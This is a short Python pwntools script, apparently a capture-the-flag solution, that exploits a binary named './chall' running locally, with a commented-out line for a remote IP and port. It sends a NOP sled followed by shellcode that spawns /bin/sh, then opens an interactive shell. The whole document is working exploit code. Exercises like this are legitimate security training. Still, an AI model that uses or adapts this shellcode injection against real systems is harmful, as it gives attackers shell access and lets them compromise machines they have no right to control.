from pwn import *

# Set up pwntools context for 64-bit Linux
context(os='linux', arch='amd64')

# Path to the binary
binary = './chall'

# Create the process (or use remote if necessary)
p = process(binary)
#p = remote('178.128.218.40', 2001)
# NOP sled (to ensure alignment)
nop_sled = b'\x90' * 100  # 100 NOP instructions

# 64-bit shellcode to spawn /bin/sh
shellcode = asm(shellcraft.amd64.linux.sh())

# Final payload: NOP sled + shellcode
payload = nop_sled + shellcode

# Log payload length
log.info(f"Payload length: {len(payload)}")

# Receive the prompt from the binary
p.recvuntil(b"give me something: ")

# Send the payload (no overflow, just injecting shellcode)
p.send(payload)

# Switch to interactive mode for the shell
p.interactive()
